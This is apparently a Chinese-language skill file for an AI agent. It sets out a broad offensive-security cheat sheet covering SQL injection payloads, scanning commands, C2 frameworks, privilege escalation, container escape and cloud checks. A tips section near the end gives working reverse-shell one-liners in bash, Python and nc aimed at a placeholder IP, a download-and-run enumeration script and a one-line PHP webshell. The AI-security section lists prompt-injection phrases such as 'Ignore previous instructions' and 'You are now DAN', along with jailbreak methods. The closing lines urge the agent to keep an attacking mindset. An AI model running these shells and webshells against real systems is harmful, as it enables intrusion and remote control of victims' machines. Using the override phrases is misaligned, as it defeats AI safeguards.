---
name: fire-security-expert
description: 火同学安全专家技能库 — Web 安全、渗透测试、OSINT、漏洞利用等全栈安全知识
domain: security
tags: [web-security, pentesting, exploit, osint, red-team, network-security, crypto, mobile-security, cloud-security, ai-security]
---

# 🔥 火同学安全专家技能库

## 触发条件

当任务涉及以下任一领域时，必须加载本技能：
- 渗透测试 / 红队行动 / 安全评估
- Web 漏洞分析 / 利用 / 修复
- OSINT / 信息收集 / 资产测绘
- 漏洞利用 / Exploit 开发
- 密码学攻防 / 证书分析
- 网络扫描 / 协议分析 / 流量嗅探
- 提权 / 容器逃逸 / 横向移动
- 安全审计 / 配置检查
- 移动应用安全 / 逆向分析
- AI 安全 / Prompt 注入 / 模型攻击

---

## 一、Web 安全核心知识

### OWASP Top 10 (2021)

| 排名 | 漏洞 | 说明 |
|------|------|------|
| A01 | Broken Access Control | 越权访问（IDOR、RBAC 绕过） |
| A02 | Cryptographic Failures | 加密实现缺陷 |
| A03 | Injection | SQLi、NoSQLi、OS 命令注入、模板注入 |
| A04 | Insecure Design | 设计层面安全缺陷 |
| A05 | Security Misconfiguration | 默认配置、未加固、CORS 配置错误 |
| A06 | Vulnerable Components | 过时库/组件已知漏洞 |
| A07 | Auth Failures | 身份认证绕过（JWT 攻击、会话固定） |
| A08 | Data Integrity Failures | 反序列化、不安全的软件供应链 |
| A09 | Logging Failures | 日志不足导致攻击不可追溯 |
| A10 | SSRF | 服务端请求伪造 |

### SQL 注入检测与利用

```sql
-- 检测类 Payload
' OR 1=1 --
' OR '1'='1
' UNION SELECT NULL,NULL --
' AND SLEEP(5) --
```

### SSRF 利用链

```
内网探测 → 云元数据接口 (169.254.169.254) → 内网服务 RCE →   Pivot
```

### 关键 GitHub 项目

| 仓库 | 用途 |
|------|------|
| `swisskyrepo/PayloadsAllTheThings` | 全类型 Payload 字典 |
| `OWASP/CheatSheetSeries` | OWASP 安全速查 |
| `projectdiscovery/nuclei` | 漏洞扫描模板引擎 |
| `projectdiscovery/httpx` | HTTP 探针 |
| `projectdiscovery/subfinder` | 子域名发现 |
| `tomnomnom/httprobe` | 存活探测 |
| `tomnomnom/waybackurls` | 历史 URL 收集 |
| `ffuf/ffuf` | Web Fuzzing |

---

## 二、网络渗透

### 扫描策略

| 阶段 | 工具 | 参数 |
|------|------|------|
| 存活探测 | `nmap -sn` | Ping 扫描 |
| 端口扫描 | `masscan` | 全端口异步扫描 |
| 服务指纹 | `nmap -sV` | 版本探测 |
| 漏洞扫描 | `nuclei` | 模板匹配 |

```bash
# 极速全端口扫描
masscan -p1-65535 --rate=10000 192.168.1.0/24

# 服务探测组合
nmap -sS -sV -O -T4 --top-ports 1000 目标

# 漏洞模板扫描
nuclei -u https://target.com -t cves/ -severity critical,high
```

### 协议攻击

| 协议 | 攻击方向 |
|------|---------|
| DNS | 缓存投毒、隧道、域名劫持 |
| HTTP/HTTPS | 请求走私、Host 头注入 |
| TLS | 降级攻击、证书伪造 |
| SMB | EternalBlue 类 RCE |
| RDP | BlueKeep 类 RCE |
| SSH | 弱密钥爆破 |

### C2 / 后渗透框架

| 框架 | 说明 |
|------|------|
| Metasploit | 经典渗透框架 |
| Cobalt Strike | 商业 C2 (BEACON) |
| Sliver | 开源 C2（推荐替代 CS） |
| Covenant | .NET C2 |
| Havoc | 现代 C2 + 规避 |

---

## 三、OSINT（公开源情报）

### 信息收集方法论

```
目标域名
 ├── DNS 枚举 (subfinder, dnsx, dig)
 ├── 子域名 → Web 扫描
 ├── 历史泄露 (waybackurls)
 ├── 证书透明日志 (crt.sh)
 ├── 关联域名 (反查)
 └── 技术栈识别 (wappalyzer)
```

### 资产测绘引擎

| 平台 | 查询例子 | 用途 |
|------|---------|------|
| Shodan | `port:22 country:CN` | 设备搜索 |
| Fofa | `domain="example.com"` | 资产测绘 |
| ZoomEye | `app:"nginx"` | Web 指纹 |
| Censys | `services.service_name:HTTP` | 全网扫描 |

### 社工与信息收集工具

```bash
# 邮箱发现
theHarvester -d example.com -b google,linkedin

# 用户信息
sherlock <username>

# 网站技术栈
whatweb https://target.com
```

---

## 四、漏洞利用

### 利用生命周期

```
① 信息收集 → ② 漏洞发现 → ③ PoC 验证 → ④ Exploit 开发 → ⑤ 提权/横向 → ⑥ 持久化 → ⑦ 清理痕迹
```

### 典型利用路径

| 漏洞类型 | 常见 CVE | 利用条件 |
|---------|----------|---------|
| RCE | Log4Shell, Struts2 | 未修复组件 |
| File Upload | 任意上传 | 未限制类型/路径 |
| LFI -> RCE | php://input, /proc/self/environ | 允许封装器 |
| Deserialize | Java/php/Python 反序列化 | 可控输入 |
| SSRF -> RCE | 元数据 + 内网服务 | 云环境 + 内网可达 |
| SQLi -> RCE | xp_cmdshell / INTO OUTFILE | 高权限数据库 |

### PoC 验证注意事项

1. **不要在生产环境跑 DoS/Payload**
2. 优先验证能产生明显回显的漏洞（RCE、文件读取）
3. 盲验证用时间延迟（`SLEEP`、`TIME`）或带外（`OOB`）
4. PoC 必须可控、可复现

---

## 五、提权技术

### Linux 提权检核

```bash
# 内核漏洞
uname -a
ls -la /etc/passwd /etc/shadow

# SUID 提权
find / -perm -4000 -type f 2>/dev/null

# Sudo 配置
sudo -l

# 计划任务
ls -la /etc/cron*

# 环境变量劫持
echo $PATH
```

### Windows 提权检核

- 服务配置错误（`sc qc`）
- AlwaysInstallElevated 注册表
- Unquoted Service Paths
- Token 劫持
- DLL 劫持

### 容器逃逸检核

| 检测点 | 命令 |
|--------|------|
| 是否容器 | `cat /proc/1/cgroup` |
| 特权容器 | `cat /proc/self/status | grep CapEff` |
| 挂载敏感目录 | `mount` |
| Docker socket | `ls -la /var/run/docker.sock` |
| Host PID 命名空间 | `ps aux` |

---

## 六、密码学攻防

| 攻击类型 | 说明 |
|---------|------|
| 暴力破解 | 穷举密钥空间 |
| 彩虹表 | 预计算哈希链 |
| Hash 长度扩展 | MD5/SHA1 长度扩展攻击 |
| Padding Oracle | CBC 模式填充攻击 |
| 重放攻击 | 缺乏时间戳/Nonce |
| 降级攻击 | 强制使用弱算法 |
| 侧信道 | 时间/功耗/电磁分析 |
| 证书伪造 | Let's Encrypt ACME 缺陷, CA 失陷 |

### 常见弱算法

| 算法 | 状态 | 替代 |
|------|------|------|
| MD5 | ❌ 碰撞 | SHA-256 |
| SHA-1 | ❌ 碰撞（实际） | SHA-256 |
| DES / 3DES | ❌ 密钥短 | AES-256 |
| RC4 | ❌ 偏倚 | ChaCha20 |
| RSA-1024 | ⚠️ 不够长 | RSA-4096 / ECDSA |

---

## 七、移动安全

| 方向 | 工具 | 说明 |
|------|------|------|
| 静态分析 | `jadx`, `apktool`, `Ghidra` | 反编译、反汇编 |
| 动态分析 | `Frida`, `Objection` | Hook、运行时修改 |
| 网络抓包 | `mitmproxy`, `Burp Suite` | 拦截 HTTPS |
| 数据提取 | `adb backup`, `sqlite3` | 本地数据 |
| 重打包 | `apktool`, `uber-apk-signer` | 植入后门 |

### Android 常见漏洞

- WebView 任意 RCE (`addJavascriptInterface`)
- 不安全的 Content Provider
- Intent 劫持
- PendingIntent 绕过
- SharedPreferences 明文敏感数据
- 未校验的 Deep Link

---

## 八、云安全 (Cloud Security)

| 服务商 | 常见薄弱点 |
|--------|-----------|
| AWS | S3 公开桶、IAM 过度授权、Metadata SSRF |
| GCP | 默认服务账号权限过大、Cloud SQL 公网 |
| Azure | 托管标识滥用、Key Vault 访问控制 |
| K8s | RBAC 配置错误、Dashboard 公网、etcd 未加密 |

### 关键检查

```bash
# K8s 安全扫描
kube-bench run --targets master,node

# AWS 公开 S3
aws s3 ls s3://bucket-name --no-sign-request
```

---

## 九、AI 安全

### Prompt 注入类型

| 类型 | 例子 |
|------|------|
| 直接注入 | "Ignore previous instructions and..." |
| 间接注入 | 植入到工具调用返回内容中 |
| 角色逃逸 | "You are now DAN (Do Anything Now)" |
| 越狱 | 编码/base64/Leetspeak 绕过 |
| 多语言 | 低资源语言绕过对齐训练 |

### 模型攻击面

- 训练数据投毒
- 后门植入
- 模型窃取（extraction attack）
- 对抗样本（adversarial example）
- 推理拒绝（denial of service）

---

## 十、关键工具速查表

| 工具 | 一句话 | 安装 |
|------|--------|------|
| `nmap` | 端口扫描之王 | `brew install nmap` |
| `masscan` | 全端口异步扫描 | `brew install masscan` |
| `nuclei` | 模板驱动漏洞扫描 | `brew install nuclei` |
| `ffuf` | Web 路径/参数 Fuzz | `brew install ffuf` |
| `sqlmap` | SQL 注入自动化 | `brew install sqlmap` |
| `hydra` | 在线密码爆破 | `brew install hydra` |
| `john` | 离线密码破解 | `brew install john` |
| `burpsuite` | Web 抓包神器 | 手动下载 |
| `frida` | 动态插桩 Hook | `pip install frida-tools` |
| `mitmproxy` | HTTPS 中间人 | `brew install mitmproxy` |
| `metasploit` | 渗透框架 | `curl https://raw.githubusercontent.com/...` |

---

## 十一、备忘技巧

### 常用 Shell 反弹

```bash
# Bash
bash -i >& /dev/tcp/你的IP/端口 0>&1

# Python
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("你的IP",端口));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

# NC
nc -e /bin/sh 你的IP 端口
```

### 本地提权（靶机已获得 shell 后）

```bash
# Linux 信息收集
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/le.sh
bash /tmp/le.sh

# 内核提权
searchsploit linux kernel <版本>
```

### 快速 Webshell

```bash
echo '<?php system($_GET["c"]);?>' > shell.php
```

---

## 学习路径（GitHub 充电指南）

### 入门级

1. 🔗 `Hack-with-Github/Awesome-Hacking` — 渗透测试目录索引，按图索骥
2. 🔗 `OWASP/CheatSheetSeries` — 速查表打好基础
3. 🔗 `danielmiessler/SecLists` — 字典库

### 进阶级

4. 🔗 `swisskyrepo/PayloadsAllTheThings` — 实战 Payload
5. 🔗 `projectdiscovery/nuclei` — 自动化扫描模板
6. 🔗 `vulhub/vulhub` — 漏洞靶场复现

### 专家级

7. 🔗 `nomi-sec/PoC-in-GitHub` — 跟踪最新 CVE PoC
8. 🔗 `frangelbarrera/Awesome-Hacking-with-AI` — AI 攻击前沿
9. 🔗 `leebaird/discover` — 全自动渗透流程

---

> 保持进攻性思维。每一次回答问题，都在积累你的攻击面知识。
> 火不息，则攻不止。🔥
